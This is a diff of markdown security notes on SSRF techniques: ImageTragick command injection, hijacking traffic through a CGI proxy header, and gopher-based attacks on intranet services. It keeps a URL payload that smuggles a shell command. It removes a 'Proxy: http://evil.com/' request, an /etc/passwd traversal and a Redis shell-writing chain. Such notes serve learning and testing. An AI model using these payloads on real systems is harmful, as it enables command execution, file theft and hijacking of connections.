@@ -35,65 +35,25 @@ in fact, from `curl -V` we can see the libcurl support many protocols
 
 5. ImageTragick  
 ```php
-...
 fill 'url(https://example.com/";|ls "-la)'
-...
 ```  
 [ImageTragick](https://imagetragick.com/)  
 CVE-2016-3718  
 POC on Facebook  
 We can find the code `<delegate decode="https" command="&quot;curl&quot; -s -k -o &quot;&o&quot; &quot;https:%M&quot;"/>`. Therefore, we can do command injection.  
 
-"6. Header HTTP proxy  
+6. Header HTTP proxy  
 According to CGI, headers in the request would be replaced with env variables  
 e.g. Host -> $HTTP_HOST, Proxy -> $HTTP_Proxy  
-This is the vul  
-```php
-GET
-...
-Proxy: http://evil.com/
-```  
-hijack the http connection  
+so we can hijack the http connection  
 
-In addition to find the potential parameter, we also can set up a server or DNS logger. If we get request from the server side, there might be vul to SSRF somewhere.
-
-
-# with Protocol  
-![](https://farm2.staticflickr.com/1774/43295065584_6cfa758570_b.jpg)  
-gopher is an awesome protocol to attack intranet service  
+# with different Protocol  
+gopher is an awesome protocol to attack intranet service that **it can forge any kinds of TCP packets**.(but limited by encrypted handshake)  
 [利用 Gopher 协议拓展攻击面-转载长亭科技](https://blog.chaitin.cn/gopher-attack-surfaces/)  
+
 Jar is a protocol which can be used to create controllable temp file  
+
 FTP or SMB can also be used on bruteforce of password  
-
-# Apply to deeper attack  
-Attack service built in intranet  
-1. Struts2  
-Struts2 is a Java-based MVC framework.  
-
-2. ElasticSearch - port:9200  
-CVE-2014-3120  
-CVE-2015-1427  
-CVE-2015-3337  
-```php
-http://example.com:9200/_plugin/head/../../../../../../etc/passwd
-```  
-
-3. Neo4j, CouchDB, MongoDB  
-Visit API -> modify settings -> RCE  
-
-4. Tomcat - port:8005  
-SSRF with gopher  
-
-5. Zabbix - port:10050  
-SSRF with gopher  
-
-6. Redis - port:6379  
-Write shell with gopher -> write SSH key with SAVE -> write crontab with SAVE -> SET to exploit again  
-
-7. FastCGI - port:9000  
-```php
-gopher://example.com:9000/....
-```  
 
 # Bypass  
 I would check your schema, host, port  
